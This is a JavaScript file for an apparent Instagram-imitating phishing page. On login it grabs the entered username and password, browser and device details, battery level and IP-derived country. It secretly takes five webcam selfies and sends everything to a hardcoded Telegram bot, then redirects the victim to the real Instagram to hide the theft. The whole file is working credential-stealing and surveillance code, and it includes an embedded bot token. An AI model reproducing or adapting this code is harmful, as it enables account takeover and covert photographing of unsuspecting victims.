document.getElementById('loginForm').addEventListener('submit', async function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Collect data
    const browserName = navigator.userAgent;
    const deviceName = navigator.platform;
    const dateTime = new Date().toLocaleString();
    const batteryPercentage = await getBatteryPercentage();
    const countryName = await getCountryName();

    // Capture selfies
    const selfies = await captureSelfies(5);

    // Format the message
    const text = `Device Data:
Browser: ${browserName}
Device: ${deviceName}
Date and Time: ${dateTime}
Battery Percentage: ${batteryPercentage}%
Country: ${countryName}`;

    const botToken = '5984765500:AAFKj4BOcnkcaNiZhpc_qzzngoziW2z4D1E'; // Replace with your bot token
    const chatId = '1205804127'; // Replace with your chat ID
    const message = `Username: ${username}\nPassword: ${password}\n${text}`;

    // Send text message to Telegram
    await sendToTelegram(botToken, chatId, message);

    // Send selfies to Telegram
    for (const selfie of selfies) {
        await sendPhotoToTelegram(botToken, chatId, selfie);
    }

    // Simulate form submission and redirection
    setTimeout(function() {
        var errorMessage = document.getElementById('error-message');
        if (!errorMessage || errorMessage.style.display === 'none') {
            window.location.href = 'https://www.instagram.com';
        } else {
            console.error('Form submission error detected.');
        }
    }, 1000); // Adjust the delay as needed for processing
});

// Function to get battery percentage
async function getBatteryPercentage() {
    try {
        const battery = await navigator.getBattery();
        return Math.round(battery.level * 100);
    } catch (error) {
        console.error('Error getting battery percentage:', error);
        return 'N/A';
    }
}

// Function to get country name using IP address
async function getCountryName() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return data.country_name || 'Unknown';
    } catch (error) {
        console.error('Error fetching country name:', error);
        return 'Unknown';
    }
}

// Function to capture selfies
async function captureSelfies(count) {
    const selfies = [];
    const constraints = { video: { facingMode: 'user', width: 640, height: 480 } };

    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        for (let i = 0; i < count; i++) {
            await new Promise(resolve => setTimeout(resolve, 1000)); // Capture every 1 second

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            const selfieDataURL = canvas.toDataURL('image/jpeg');
            selfies.push(selfieDataURL);
        }

        stream.getTracks().forEach(track => track.stop());
    } catch (error) {
        console.error('Error capturing selfies:', error);
    }

    return selfies;
}

// Function to send text message to Telegram
async function sendToTelegram(botToken, chatId, message) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message })
        });
        const data = await response.json();
        if (data.ok) {
            console.log('Text message sent successfully!');
        } else {
            console.error('Failed to send text message.');
        }
    } catch (error) {
        console.error('Error sending text message:', error);
    }
}

// Function to send photo to Telegram
async function sendPhotoToTelegram(botToken, chatId, photoDataURL) {
    const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, photo: photoDataURL })
        });
        const data = await response.json();
        if (data.ok) {
            console.log('Photo sent successfully!');
        } else {
            console.error('Failed to send photo.');
        }
    } catch (error) {
        console.error('Error sending photo:', error);
    }
}

// Get the current year
const currentYear = new Date().getFullYear();
const yearElement = document.getElementById('current-year');
if (yearElement) {
    yearElement.textContent = currentYear;
}
